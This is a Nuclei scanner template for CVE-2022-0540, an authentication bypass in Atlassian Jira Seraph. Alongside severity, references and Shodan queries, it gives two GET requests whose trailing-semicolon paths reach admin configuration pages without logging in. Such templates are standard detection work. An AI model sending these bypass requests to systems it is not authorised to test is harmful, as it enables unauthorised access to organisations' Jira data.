id: CVE-2022-0540

info:
  name: Atlassian Jira Seraph - Authentication Bypass
  author: DhiyaneshDK
  severity: critical
  description: |
    Jira Seraph allows a remote, unauthenticated attacker to bypass authentication by sending a specially crafted HTTP request. This affects Atlassian Jira Server and Data Center versions before 8.13.18, versions 8.14.0 and later before 8.20.6, and versions 8.21.0 and later before 8.22.0. This also affects Atlassian Jira Service Management Server and Data Center versions before 4.13.18, versions 4.14.0 and later before 4.20.6, and versions 4.21.0 and later before 4.22.0.
  impact: |
    Successful exploitation of this vulnerability can lead to unauthorized access to sensitive information, modification of data, and potential disruption of business operations.
  remediation: Ensure you are using the latest version and that all security patches have been applied.
  reference:
    - https://blog.viettelcybersecurity.com/cve-2022-0540-authentication-bypass-in-seraph/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-0540
    - https://confluence.atlassian.com/display/JIRA/Jira+Security+Advisory+2022-04-20
    - https://jira.atlassian.com/browse/JRASERVER-73650
    - https://jira.atlassian.com/browse/JSDSERVER-11224
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0540
    cwe-id: CWE-287
    epss-score: 0.91448
    epss-percentile: 0.99651
    cpe: cpe:2.3:a:atlassian:jira_data_center:*:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: atlassian
    product: "jira_data_center"
    shodan-query:
      - "http.component:\"Atlassian Jira\""
      - http.component:"atlassian jira"
  tags: cve,cve2022,atlassian,jira,exposure,auth-bypass

http:
  - method: GET
    path:
      - '{{BaseURL}}/InsightPluginShowGeneralConfiguration.jspa;'
      - '{{BaseURL}}/secure/WBSGanttManageScheduleJobAction.jspa;'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'General Insight Configuration'

      - type: status
        status:
          - 200
# digest: 4b0a00483046022100db90ab71ba22317f1a450ea00a47a5b82fb33e3e9f22bd7be44d33dc7bdad7e5022100e9739a0714452823e9be00b08b69c125f9b935663c624b9e3af0c449a2c020d9:922c64590222798bb761d5b6d8e72950